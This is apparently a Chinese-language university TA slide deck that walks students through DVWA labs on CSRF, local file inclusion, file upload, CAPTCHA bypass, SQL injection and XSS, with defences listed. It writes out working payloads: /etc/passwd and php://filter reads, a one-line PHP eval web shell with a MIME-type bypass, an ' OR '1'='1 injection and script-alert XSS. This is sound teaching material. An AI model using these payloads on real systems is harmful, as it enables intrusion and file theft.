---
title: 107 DVWA
tags: 大學 , 助教 , 安全程式
---

架設dvwa
```
$ sudo apt-get install docker.io
$ sudo service docker start
$ sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

---

## CSRF
- 跨站請求偽造

---

- http://superlogout.com

---

## what
- 攻擊者偽造使用者送出請求
    - 使用者曾認證/登入過


---

## 舉個例子
- 今天有個刪除功能的部落格
- ![](https://i.imgur.com/1YRTgH6.png)

---

### 刪除功能
- 假設GET方法
- `<a href='/delete?id=5'>刪除</a>`
- 後端驗證
    - 查看是否有`session id`(是否有登入)
    - 此`session id`是否為該文章作者
    - 如果符合就刪除文章

---

### 駭客來了
- 社交工程
    - 短網址讓使用者點
- 惡意程式碼


---

### 以為有做驗證，但其實還不夠
- 使用者防範
    - 每次使用網站後登出
- 伺服器端
    - `擋掉從別的 domain 來的 request`
    - 檢查Referer
    - 加入圖形驗證碼
    - 加上CSRF token

---

### CSRF token
- 確保只有使用者知道的資訊
- 每次更換



---


## File Inclusion
# File Inclusion
 （文件包含）

---


本地文件包含漏洞
又稱作為 LFI 〈 Local File Inclusion 〉，使用者能控制包含的文件參數，並利用 \.\.\/ 觀看整個目錄，是一個惡名昭彰的漏洞。
若能上傳自定義的 PHP 檔，則利用 LFI 會有更大的危害。

---

漏洞原因

---

`git clone https://github.com/123ojp/FCU_TA_107_Stu.git
`
![](https://i.imgur.com/jPz3MLQ.png)

---

`sudo curl -L "https://github.com/docker/compose/releases/download/1.22.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose `
`sudo chmod +x /usr/local/bin/docker-compose`

`docker-compose --version`

![](https://i.imgur.com/dEsb1vt.png)

---

`cd FCU_TA_107_Stu/web/include_php/`
`sudo docker-compose up -d`
![](https://i.imgur.com/LQ1J35w.png)

---

http://127.0.0.1:10002/

---


總共有 3 個連結，隨便點個進去瞧瞧
![](https://i.imgur.com/UaF2RTB.jpg)

---

發現網址改變了
![](https://i.imgur.com/Z60F9h1.jpg)

---

試著改改看網址，發現可以進入別的地方
http://localhost/DVWA-master/vulnerabilities/fi/?page=file4.php
![](https://i.imgur.com/piGXM4I.jpg)

---

試試看直接查看主機文件
```
page=c:/Windows/System32/drivers/etc/hosts
page=/etc/passwd
```
![](https://i.imgur.com/E34xp2F.jpg)


---

我們再試著進入其他的東西
```
page=php://filter/convert.base64-encode/resource=index.php
```
![](https://i.imgur.com/YA0claw.jpg)

---

那一串是用 base64 編碼過後的樣子
我們解碼一下就可以看到原始碼
![](https://i.imgur.com/IJ86a33.jpg)

---


![](https://i.imgur.com/VDbsi8H.jpg)


---

[更多用法](https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md)
[PHP stream](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)

---


防護手法:

- 透過修改 php.ini 的設定 「_allow\_url\_fopen_」，這個值可以決定 PHP 是否可以載入外部的 PHP Script ，我們可以設定 allow\_url\_fopen = false ，來防止相關的攻擊。
- 不要讓使用者的輸入當作檔案讀取的路徑

---


# File Upload
 （文件上傳）

---

## Security : Low

---

可以上傳東西
![](https://i.imgur.com/kOyLwbn.jpg)

---

這裡有一句話木馬 用 txt 來編輯
檔名叫 hack.php
```
<?php
eval($_GET[CMD]);
?>
```
![](https://i.imgur.com/47kHf1U.jpg)

---

上傳完還告訴你位置
![](https://i.imgur.com/ATRtUZk.jpg)


---

查看 php 的 所有相關訊息
http://localhost/dvwa/hackable/uploads/hack.php?CMD=phpinfo();
![](https://i.imgur.com/cAX340K.jpg)

---

## Security : Medium

---

直接傳 php 檔被擋掉了
他要求要 jpeg 或 png
![](https://i.imgur.com/DHFmBnc.jpg)

---

打開 [brup suite](https://hackmd.io/p/BJHFhwEhm#/19)
跟剛剛一樣的設定走
然後抓送出的封包
![](https://i.imgur.com/jaemRQ1.jpg)

---

可以看到他的類型並不是他要求的圖片檔
![](https://i.imgur.com/eyrDfBZ.jpg)

---

我們把它改成圖片檔
然後送出
![](https://i.imgur.com/N723ceZ.jpg)

---

就成功囉~~
![](https://i.imgur.com/HYZ4Lxk.jpg)

---




防護手法:

-   確認檔案相關的權限，特別是寫入的權限應該要透過控管。
-   確認檔名。例如 null byte ( %00 )或是特殊符號的禁止
    -   像是 / or \ 或是 \.\.。
-   確認檔案內的型態內容
    -   例如 jpg，png 為副檔名時，確認該檔案是否為圖形檔。
-   用防毒軟體掃描該檔案是否為已知惡性程式。
-   禁制特定類型可執行的檔案
    -   例如 js，exe，sh，html 等


---


# Insecure CAPTCHA
 （不安全的驗證碼）


---

![](https://i.imgur.com/03uO92l.jpg)



---

右鍵 -> 檢查
發現有一個東西被隱藏 叫 step 值是 1
![](https://i.imgur.com/orNRBtq.jpg)

---

先照著原本的走
看看他有甚麼變化
點到 network -> captcha/
![](https://i.imgur.com/loRrOJH.jpg)

---

進去之後發現 step 出現了
再按下 change
![](https://i.imgur.com/keIThYN.jpg)


---

到這裡確定更改成功
step 變成 2 了
![](https://i.imgur.com/xWtJ1pm.jpg)

---

找到step的地方，改掉他，直接讓他變成 2
![](https://i.imgur.com/OaRzbqS.jpg)

---

然後就可以繞過驗證改密碼了~
![](https://i.imgur.com/cRlhj6X.jpg)


---


# SQL Injection
 （SQL注入）

---

簡稱隱碼攻擊

發生於應用程式之資料庫層的安全漏洞

在輸入的字串之中夾帶 SQL 指令，在設計不良的程式當中忽略了檢查，那麼這些夾帶進去的指令就會被資料庫伺服器誤認為是正常的 SQL 指令而執行，因此遭到破壞或是入侵

---

這個我們之後的社課會有一堂特別講 SQL
我們就來簡單地玩一下就好

---


我們來輸入
```
' OR '1'='1
```
---

就蹦出一大堆東西惹
![](https://i.imgur.com/f67CsHC.jpg)

---

看一下原始碼
![](https://i.imgur.com/DLJ9qmy.jpg)



---

從
```
$query="SELECT first_name, las_name FROM users WHERE user_id = '$id;';
```
輸入變成
```
$query="SELECT first_name, las_name FROM users WHERE user_id = '' OR '1'='1';
```

---


# XSS（Reflected）
 （反射型跨站腳本）


---

![](https://i.imgur.com/vaGac6f.jpg)

---

跨網站指令碼

是一種網站應用程式的安全漏洞攻擊

它允許惡意使用者將程式碼注入到網頁上，其他使用者在觀看網頁時就會受到影響


---

直接打上
```
<script>alert("code executed")</script>
```
![](https://i.imgur.com/7m4HNxo.jpg)

---


# XSS（ Stored ）
 （存儲型跨站腳本）


---

![](https://i.imgur.com/ZxLWjLw.jpg)


---


看起來是留言版功能
就留
```
<script>alert("code executed")</script>
```
![](https://i.imgur.com/Z6B5Tcn.jpg)

---

就算我重新進來這裡，還是會存在
![](https://i.imgur.com/Z6B5Tcn.jpg)

---


